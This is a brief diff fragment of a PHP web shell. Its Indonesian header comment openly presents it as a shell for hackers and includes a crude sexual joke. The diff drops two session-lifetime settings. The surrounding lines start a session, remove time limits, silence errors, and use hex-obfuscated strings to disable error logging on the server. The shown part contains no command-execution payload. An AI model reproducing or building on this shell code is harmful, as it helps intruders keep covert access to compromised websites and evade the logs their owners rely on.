@@ -7,10 +7,8 @@ Salam Heker Pro
 SHELL INI DIBUAT KHUSUS BUAT HACKER YANG SANGEAN YA GES YA, BIAR BISA NGEHACK SAMBIL COLI
 */
 session_start();
-session_set_cookie_params(3600 * 24);
 set_time_limit(0);
 error_reporting(0);
-@ini_set('session.gc_maxlifetime', 3600 * 24);
 @ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67', null);
 @ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73', 0);
 @ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65', 0);
